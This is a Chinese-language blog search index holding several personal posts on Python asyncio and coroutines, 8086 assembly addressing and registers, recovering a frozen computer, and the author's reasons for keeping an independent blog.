    <content type="text"><![CDATA[Python从3.4版本开始，引入asyncio标准库；从3.5版本开始，引入async/await语法声明。对于py3，将一个函数升级为协程（或者说“协程函数”）通常有以下两种办法： asyncio.coroutine装饰器+yield from本地调用 async关键字+await本地调用（推荐） 注意，和普通函数不同，协程函数不能直接调用，必须借助事件循环（event loop） 1234567891011121314151617181920212223242526In [1]: import asyncio In [2]: async def a(): ...: print('Hello async, I am coroutine A!') ...: return '**DONE**' ...: In [3]: @asyncio.coroutine ...: def b(): ...: print('Hello async, I am coroutine B!') ...: return '**DONE**' ...: In [4]: a() Out[4]: In [5]: b() Out[5]: In [6]: asyncio.run(a()) Hello async, I am coroutine A!Out[6]: '**DONE**'In [7]: asyncio.run(b()) Hello async, I am coroutine B!Out[7]: '**DONE**' 事件循环是每个asyncio应用的核心，asyncio也不过是一个事件循环框架罢了。事件循环会运行异步任务和回调，执行网络IO操作，以及运行子程序。应用开发者通常应当使用高层级的asyncio函数，例如asyncio.run()，应当很少有必要引用循环对象或调用其方法。 什么是事件循环？根据维基百科，事件循环“是在程序中等待并调遣时间或消息的编程结构”。 事件循环提供了这样一种机制，“when A happens then do B”。基本上，事件循环会监视什么时候发生了什么，当事件循环关心的事情发生时，它会调用任何关心发生了什么的代码。 下面这个例子，它满足 一个线程 并发执行 12345678910111213import threadingimport asyncio@async.coroutine#async def hello(): print('Hello world! (%s)' % threading.currentThread()) yield from asyncio.sleep(1) #await asyncio.sleep(1) print('Hello again! (%s)' % threading.currentThread())loop = asyncio.get_event_loop()tasks = [hello(), hello()]loop.run_until_complete(asyncio.wait(tasks)) #run_until_complete在future对象完成后返回，而run_forever在stop前会一直存在。loop.close() 输出结果12345Hello world! ()Hello world! ()（暂停约1s）Hello again! ()Hello again! () 如果将上面的asyncio.sleep()换成真正需要执行的操作，则多个coroutine就可以由1个thread并发执行。 1234567891011121314151617181920212223import asyncioimport timeasync def main(): print('Coroutine runs at', time.strftime('%X')) await a() await b() await c() print('Coroutine ends at', time.strftime('%X'))async def a(): await asyncio.sleep(1) print('1秒 ->', time.strftime('%X'))async def b(): await asyncio.sleep(2) print('2秒 ->', time.strftime('%X'))async def c(): await asyncio.sleep(3) print('3秒 ->', time.strftime('%X'))asyncio.run(main()) 输出结果12345Coroutine runs at 17:27:241秒 -> 17:27:252秒 -> 17:27:273秒 -> 17:27:30Coroutine ends at 17:27:30 如果一个对象在await语句中使用，那么它就是可等待对象。许多asyncio API都被设计为接受可等待对象。可等待对象有三种主要类型，其中Future可看成是Task的超集： coroutine task future asyncio.create_task()函数用来并发作为asyncio任务的多个协程，修改上面的例子，让它单线程并发执行。我只修改了main函数部分，如下所示。123456789async def main(): print('Coroutine runs!', time.strftime('%X')) a_task = asyncio.create_task(a()) b_task = asyncio.create_task(b()) c_task = asyncio.create_task(c()) await a_task await b_task await c_task print('Coroutine ends!', time.strftime('%X')) 输出结果12345Coroutine runs at 17:53:111秒 -> 17:53:122秒 -> 17:53:133秒 -> 17:53:14Coroutine ends at 17:53:14 asyncio.create_task()方法于python3.7添加到标准库中，对于低版本用户，改用低层级函数asyncio.ensure_future()，具体使用上并无二致，仅仅将函数名改一下即可。 再次强调，asyncio实现的是：单线程、并发执行。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>并发编程</category>
      </categories>
      <tags>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[协程（一）]]></title>
    <url>%2F%E5%8D%8F%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[协程是计算机程序的一类组件，推广了协作式多任务的子程序，允许被挂起与被恢复。相对子例程而言，协程更为一般和灵活，但在实践中使用没有子例程那样广泛。协程源自Simula和Modula-2的语言，但也有其它语言支持。协程更适合用来实现彼此熟悉的程序组件，如协作式多任务、异常处理、事件循环、迭代器、无线列表和管道。根据高德纳的说法，马尔文·康威于1958年发明了术语coroutine并用于构建汇编程序，协程最初在1963年被提出。 下面是一个简单的协程示例（python）12345678910111213141516>>> def simple_coroutine():... print('-> coroutine started')... x = yield... print('-> coroutine recived', x)... >>> my_coro = simple_coroutine()>>> my_coro.send(None)-> coroutine started>>> my_coro.send(422)-> coroutine recived 422 ... Original exception was:Traceback (most recent call last): File "", line 1, in StopIteration>>> 将协程看成是轻量级的线程即可。 印象中，协程总是和“生产者-消费者”模式有关系 某个模块负责产生数据，这些数据由另外一个模块负责处理 满足“生产者-缓冲区（缓冲数据）-消费者”的模型 缓冲区的好处在于将生产者和消费者行为解耦合，这是最明显的。通常使用队列queue进行模拟。 123456/*生产者协程*/loop while q is not full create some new items add the tiems to q yield to consume 123456/*消费者协程*/loop while q is not empty remove some items from q use the items yield to produce 生产者生产产品，如果缓冲区已满，停止生产，生产者协程阻塞。等待消费者消费。消费者消费产品，如果缓冲区已空，停止消费，消费者协程阻塞。等待生产者生产。 麦当劳的柜台是一个生产者，消费者和产生者可以是一对多、多对一，也可以是多对多的形式。当你正犹豫不觉要点些什么的时候，面前的店员跑去招呼别的客人，这就是协程。 下面是一个使用协程的例子 12345678910111213141516171819count = 0def consumer(): global count while True: count -= 1 count = yield count print('[Consumer] Number of %d' %count)def producer(c): global count next(c) while True: count += 1 count = c.send(count) print('[Producer] Number of %d' %count)c = consumer()producer(c) 加上多线程（仅作为演示，想要提高效率我选择多进程），看看效果 123456789101112131415161718192021222324252627import threadingcount = 0def consumer(name): global count while True: count -= 1 count = yield count print('[Consumer] Number of %d by %s' %(count, name))def producer(c): global count next(c) while True: count += 1 count = c.send(count) print('[Producer] Number of %d' %count)c1 = consumer('c1')c2 = consumer('c2')c3 = consumer('c3')pt1 = threading.Thread(target=producer, args=(c1,))pt2 = threading.Thread(target=producer, args=(c2,))pt3 = threading.Thread(target=producer, args=(c3,))pt1.start();pt2.start();pt3.start() 两次的结果分别如下图所示（左：不加多线程，右：加了多线程） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>并发编程</category>
      </categories>
      <tags>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编复习（二）]]></title>
    <url>%2F%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89.html</url>
    <content type="text"><![CDATA[汇编指令汇编指令由两部分组成 操作码 操作数 其中操作码必须有，而操作数可以有一个或两个，也可以没有。零操作数指令或一个的，另外的操作数是隐含的。比如push指令，1push bx ;将栈顶的值推到bx中，栈顶的值就是另一个隐含的操作数 寻址方式寻址的意思是，寻找操作数所存放的位置（地址）。一共有7种寻址方式，它们是： 立即数寻址 1mov ax, 10h 寄存器寻址 12mov ax, bxinc cx 存储器寻址（5种）存储器指内存和IO端口。 直接寻址操作数在内存中，操作数的偏移地址直接表示在指令中。 12mov al, [1064h] ;默认操作数存放在数据段mov al, es:[1064h] ;指明段超越ES 间接寻址操作数存储在存储器中，操作数的偏移地址在BX、SI、DI和BP的某个寄存器中。若以BX、SI、DI作为间接寻址寄存器，默认操作数存放在数据段中，用DS寄存；若以BP作为间接寻址寄存器，则默认操作数存储在堆栈段，用SS寄存。和直接寻址一样，简介寻址也可以有段超越。 12mov ax, [si]mov [bx], al 相对寻址操作数在存储器中，操作数的有效地址是一个基址寄存器（BX、BP）或变址寄存器（SI、DI）的内容加上指令中给定的8位或16位位移量之和。若以BX、SI、DI作为间接寻址寄存器，默认操作数存放在数据段中，用DS寄存；若以BP作为间接寻址寄存器，则默认操作数存储在堆栈段，用SS寄存。这两点和上面一样。 1mov cl, [bx+1064h] ;默认数据段 基址加变址寻址BX、BP是基址寄存器，DI、SI是变址寄存器。 12mov ah, [bp][si] ;不论基址还是变址都是偏移地址，根据基地址寄存器找段寄存器 ;由bp知，段寄存器是ss，故ah=[ssx10h+bp+si] 相对基址加变址寻址在4-基址加变址的基础上，再加上一个偏移量。 1mov [bx+di+1234h], ah ;[bx+di+1234h]=dsx10h+bx+di+1234h 数据传送指令一、 通用传送指令 基本传送指令mov1mov dst src 所有传送指令都不影响标志寄存器的标志位。 mov指令不能实现以下操作： 存储器和存储器之间不能直接传送，这是错的：mov [1000h], [di] 立即数不能直接送到段寄存器，这是错的：mov ds, 2000h 段寄存器之间不能直接传送，这是错的：mov es, ds CS不能作为目的操作数，这是错的：mov cs, ax 源操作数和目的操作数的宽度必须相同，这是错的：mov al, 1000h 堆栈指令push和pop堆栈：后进先出（Last In First Out） 压栈1push bx 出栈12poppop ax 堆栈的作用： 存放寄存器或存储器中暂时不用的数据，需要时可方便的弹出 调用子程序或发生中断时要保护断点信息，子程序或中断返回时恢复断点信息 画图时，高地址在下，低地址在上。每次push，ip减少相应长度；每次pop，ip增加相应长度。 交换指令xchg数据交换指令是实现两个操作数之间的位置互换的指令，这两个操作数可以是两个寄存器操作数，或一个寄存器操作数与一个存储器操作数，或两个存储器操作数，在多处理机制中，也可以是一个寄存器操作数和一个共享存储器操作数。数据交换指令实现了数据的双向传递，一个数据交换指令起到了三条数据传送指令的作用。 xchg指令只能发生在以下两种情况 寄存器和寄存器的xchg 寄存器和存储器的xchg 公式1xchg dst, src ;(dst) (src) 存储器之间不能直接交换段寄存器不能作为操作数允许字或字节操作 二、累加器专用传送指令 输入指令IN用于CPU向从外设备端口接收数据 1234in al, data8 ;从8位端口地址输入一个字节in ax, data8 ;从8位端口地址输入一个字in al, dx ;从16位端口地址输入一个字节in ax, dx ;从16为端口地址输入一个字 输出指令OUT用于CPU向外设备端口发送数据 1234out data8, al ;向8位地址端口输出一个字节out data8, ax ;向8位地址端口输出一个字out dx, al ;向16位地址端口输出一个字节out dx, ax ;向16位地址端口输出一个字 三、目的地址传送指令 8086CPU提供了三条，分别是 lea（取偏移地址） lds（取数据内容） les（取数据内容） （1）lea（load effective address）功能：将源操作数的偏移地址传送到目的操作数1lea reg16, mem ;注：reg16指16位通用寄存器，和上面data8一样，都是简写。 设(bx)=0400h，(si)=003ch，lea bx, [bx+si+0f62h]执行指令后，源操作数地址为(bx)+(si)+0f62h=0400h+003ch+0f62h=139eh则(bx)=139eh （2）lds（load pointer using DS）功能：将源操作数指定的4个相继字节的数据分别传送到指令指定的寄存器和ds中1lds reg16, mem ;(reg16)]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>温故知新</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编复习（一）]]></title>
    <url>%2F%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[汇编汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制电路或其它可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码，用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的，不同平台之间不可直接移植。 进制进制即进位计算制，是人为定义的带进位的计数方法。在早期设计的机械计算装置中，使用的还不是二进制，而是十进制或其它进制，利用齿轮的不同位置表示不同的数值，这种计算装置更加接近人类的思维方式。但是随着计算量的增加，随着电子电路的发展，二进制的优越性便逐渐凸显。使用二进制机器码，可以很方便的描述电路的各种状态，以及它们组合产生的不同逻辑门。 使用二级制的好处： 技术实现简单 简化运算规则 适合逻辑运算 易于进行转换 二进制的抗干扰能力强，只有高电位和低电位两个状态。 二级制的好处大大的有，但是坏处是书写麻烦，逢二进一的计数方案并不适合人类书写记忆。为了克服这一障碍，于是我们有了十六进制来表示二进制。十六进制转换有16位，每一个数字位上可以是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F，这十五个数字之一。按照进位规则，十六进制逢十六进一。 十进制转换二进制：除二取余法 二进制和十六进制的相互转换：取四合一法、取一拆四法 比特和存储器计算机中最小的信息单位是bit（比特，位），也就是一个二进制位。计算机中最小的数据存储单位是Byte（B字节），8 bit = 1 byte。 1024B =1KB 1024KB=1MB 1024MB=1GB 1024GB=1TB 存储器被划分为若干个存储单元，一个存储单元可以存储一个字节，也就是8个二进制位。对于一个有128个存储单元的存储器： 容量为128字节 编号就是0-127 每个存储单元由两部分组成： 存储单元的地址（十六进制） 存储单元的内容（十六进制） 它们在计算机中，看起来是这样的。如下如所示，存储了02h 1Ah ACh 00h BEh这叫小端存储，即高位字节放在高地址，低位字节放在地地址。与之相对的还有大端，其存储规则相反。 段（segment）最常见的代码段（code segment）和数据段（data segment）。代码段：存储程序的指令。一般可读、不可写、可执行。数据段：存储程序中用到的数据。一般可读、可写、可执行。 8086CPU有四个段寄存器 CS：代码段（code segment） DS：数据段（data segment） SS：栈段（stack segment） ES：附加（extra segment） 8086CPU任意时刻，将CS:IP指向的内容作为即将下一步执行的指令。也就是说，通过改变CS:IP的值，可以改变程序的执行流程。 只修改IP（段内转移），比如 jmp ax 同时修改CS:IP（段间转移），比如 jmp 3:0B13 地址计算机根据物理地址对代码进行定位。12物理地址 = 基础地址 + 偏移地址 = 基础地址 + 段地址x10H 逻辑地址从应用程序角度看待内存。其形式为1段基地址:段内偏移地址 将逻辑地址左移4位，加上偏移地址就得到20位物理地址。比如：逻辑地址1234:100 -> 物理地址12400。左移四位就是一个十六进制进位。 标志寄存器标志寄存器的命名，总是某F的形式（xx flag）。8086CPU的几个标志位如下。（标志寄存器是一个整体，其中CF、OF等都是它上面的某个bit位） CF：进位 PF：奇偶 AF：辅助 ZF：为零 SF：符号 TF：单步 IF：中断 DF：方向 OF：溢出 状态位如CF、PF等，判断为真时等于1，否则为0。TF、IF、DF，这些都是控制位，用于控制程序。 详解 CF（carry flag）：进位标志位，一般情况进行无符号运算时，它记录运算结果的最高位向更高位的进位值，或从更高位的借位值，如果运算结果的最高位产生了一个进位或错位，那么其值为1，否则为0。 ZF（zero flag）：零位标志位，它记录相关指令执行后的结果是否为0，如果是0，那么ZF=1，否则为0。 SF（sign flag）：符号标志位，它记录相关指令执行后的结果是否为负，如果为负，那么SF=1，否则为0。 OF（overflow flag）：溢出标志位，在进行有符号数运算的时候，如果结果超出了计算机所能表示的范围称为溢出，此时OF=1，否则为0。 以及两个用于程序控制的控制位 TF（trap flag）：追踪标志位，当追踪标志位被置为1时，CPU进入单步执行方式，即每执行一条指令产生一个单步中断请求。 IF（interrupt-enable FLAG）：中断允许标志位，用于决定CPU是否相应CPU外部的可屏蔽中断发出的中断请求，但不管该标志为何值，CPU都必须相应CPU外部的不可屏蔽中断发出的中断请求，以及CPU内部产生的中断请求。IF=1，CPU可响应CPU外部的可屏蔽中断发出的请求，IF=0，CPU可不响应CPU外部的可屏蔽中断发出的请求。CPU的指令系统中也有专门的指令来改变标志位IF的值。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>温故知新</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电脑死机，以后别再强制重启了]]></title>
    <url>%2F%E7%94%B5%E8%84%91%E6%AD%BB%E6%9C%BA%EF%BC%8C%E4%BB%A5%E5%90%8E%E5%88%AB%E5%86%8D%E5%BC%BA%E5%88%B6%E9%87%8D%E5%90%AF%E4%BA%86.html</url>
    <content type="text"><![CDATA[对于那些习惯于Windows的人，crash似乎已经成了家常便饭。别急着强制重启，ctrl+shift+esc/delete调出任务管理器，然后重新建立一个新的explorer.exe，如果是Windwos8以上用户，可直接在打开的界面选择重新载入Windows资源管理器。 如果你是Linux用户，请使用下面的方法。同时按住alt+ctrl+SysReq/PtrScr一到两秒钟，保持alt和ctrl，松开SysReq/PrtScr，依次按下r、e、i、s、u、b这六个键，当你按下最后的一个b时，不出意外地话Linux就重启了。（在这之前，如果尝试alt+ctrl+f[1-7]登录可行，就在终端下搞定，不过一般死机终端是打不开的） 至于Mac系列，按opt+cmd+esc，选择需要关闭的程序即可，如果仍无响应再考虑强制重启。 别再傻傻的强制重启了，对电脑不好，这样做不但对磁盘硬件造成一定损害，而且会使内存中的数据丢失。数据是无价的，而且这样做真的对电脑伤害很大。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>电脑技巧</category>
      </categories>
      <tags>
        <tag>别作死</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我为什么写独立博客]]></title>
    <url>%2F%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2.html</url>
    <content type="text"><![CDATA[这是最好的时代，也是最坏的时代。这是智慧的时代，也是愚蠢的时代。这是信任的时代，也是怀疑的时代。这是光明的季节，亦是黑暗的季节。这是希望之暖春，亦是失望之隆冬。我们拥有着一切，我们也一无所有。人人向往着天堂，人人通往着地狱。—— 狄更斯《双城记》 独立博客作为知识备份这是一个知识爆炸的时代，正如狄更斯在《双城记》中所言，“这是最好的时代，也是最坏的时代”，自媒体的兴起，人人都是写手，都是发言人。这本来是好事，对于新事物不应该断然否定。汇集于网上的公开课，各种教程，眼花缭乱。知识的门槛降低了，获取知识的途径，除了传统的读书识记外，网络这把双刃剑，若能合理运用，对于知识能力的提升也是有好处的。我将本博客寄存与Github上，它提供了Github Page的功能，可以很方便的搭建属于自己的私人博客。花钱每个域名，只要不是特别常见的，通常都很便宜（我的这个域名在腾讯买的，首年只要一块钱）。正因为这只一个知识爆炸的时代，所以在获取、索要知识之余，整理复习便显得尤为重要。我将我学到的知识点，或是新悟出来的技巧，写下来，记到博客上面，也算是一个备份。 独立博客的灵活性更大除了独立博客，各大平台的第三方博客同样可以做只是备份，我之所以选择独立博客，还有一个原因，即相比于后者，独立博客的灵活性更大。本博客采用Hexo框架和Next主题搭建，它们的源码都托管在Github上面，我可以直接看它的源码，直接从源码级别对网站修改。还有人前端厉害点且时间充裕的，不需要别人的框架和主题，完全可以自己写一个博客。当然也可以像我一样直接用别人写好的框架，选择和选择之间通常没有优劣之分。我没有选择WordPress、Typecho这样封装得比较好的博客系统，因为它需要购买ECS，而用 Hexo（或者Jekyll）搭建，源码托管在Github上面，完全不用自己掏钱。另一方面，Hexo对应的是静态博客，而 Wordpress、Typecho，它们是动态博客，虽然可能在外观上后者更上一筹（我的博客也不算丑吧，我想），但是静态博客有一个天生的优势，那就是速度，静态博客的访问速度还是挺快的，追求极致一点，稍微优化下，几乎就是秒开。对于一个有点极简思想的人来说，这是我最喜欢的了（效率高）。除此之外，SEO、安全性和稳定性方面，静态博客总的来所也是强于动态博客的。所以我选择Hexo搭建我的独立博客，Hexo的创造者是中国台湾人，文档读起来也舒服。我选择了Next主题，先声明我绝对不是在人云亦云跟风（Next 主题目前而言，人气还是相当高的，和别的主题比起来的话）。在尝试了Yilia、Suka以及默认的landspace主题后，我还是选择了Next主题，不是说别的主题不好，毕竟仁者见仁，智者见智，适合自己的才是最好的。 独立博客让我有归属感以前在CSDN上面写博客，感觉自己就是在为别人写字。虽然都有自己的独立博客空间，但是那毕竟是别人的。最坑爹的是，写的文章还要审核，这是我最不能容忍的。在第三方博客平台写字，好处就是不用自己维护，不用自己掏钱，别人什么都帮你搞好了，坏处就是，我没有归属感，觉得自己在被别人管！！这很讨厌。我是一个自由独立的思想者，不是被迫工作的机器。被人管着，嗯……虽然人家嘴上没说什么，但是毕竟事实就是这样。被别人管着，我就无法集中在精神，更无法做一些创造性的工作。这样的后果是十分严重的，我以前已经吃过这样的亏了，现在，还有以后，务必以史为鉴。而在独立博客上写字，感觉这就是我的地盘，我就是这里的主宰，我的域名，我的文字，我的代码……唯一不足的就是，代码还是托管在别人那里，这点暂且记着，以后总会有办法的。；）此外从隐私保护的角度看，独立博客比平台博客安全，没有什么账号密码的绑定，在我的独立博客范围内一切似乎都是可控的，都是可以由我的意识而随心改变的。喜欢。 独立博客是独立的这不是废话，独立博客是独立的。试想自己写作的博客平台突然破产倒闭了，那上面的博文怎搞？数据无价，这是要转移的，而如果是自己的私人独立博客，则不存在这样的事情。网易博客的倒闭，已经让我意识到了一些东西，我不希望把自己的知识财富寄托于别人的平台，如果别人死了，那我的博客凭什么也要一起死？不喜欢，那种感觉，肯定不好过，不同于寄人篱下的悲苦，唯有自己动手，方能丰衣足食。独立博客是独立的，不但从物理上将，对我而言，在精神上也是如此。没有了寄人篱下的精神枷锁，我可以随心所欲的写，我的思想，我的文字。这种感觉好，我喜欢。 这是一个知识共享的时代，却也是一个知识产权的时代，什么都讲究隐私，都讲究权益，科技为我们带来了便利的同时，也希望自己不要忘记初心…… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
